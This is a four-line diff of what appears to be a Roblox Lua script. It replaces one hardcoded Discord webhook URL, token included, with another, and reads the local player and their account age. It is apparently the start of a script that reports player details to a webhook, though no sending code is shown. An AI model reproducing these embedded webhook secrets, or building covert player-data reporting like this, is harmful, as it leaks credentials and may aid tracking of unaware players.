@@ -1,4 +1,4 @@
-local webhook = "https://discord.com/api/webhooks/1279783612757053521/hW390WOiaIXJPEgWzDri_1e96l61TBFbEeAE_5QJE7Cvsf1Fd7HWd5cu-9DbRMvPjGWL"
+local webhook = "https://discord.com/api/webhooks/1279783609343152243/_h5Bo12k8ceP4I2YNW-it0HtsxmanmETFA7LtD9CFsyPpiGU1FgW635xPrDU-Mjxdu90"
 local at_pingId = ""
 local player = game:GetService("Players").LocalPlayer
 local age = player.AccountAge
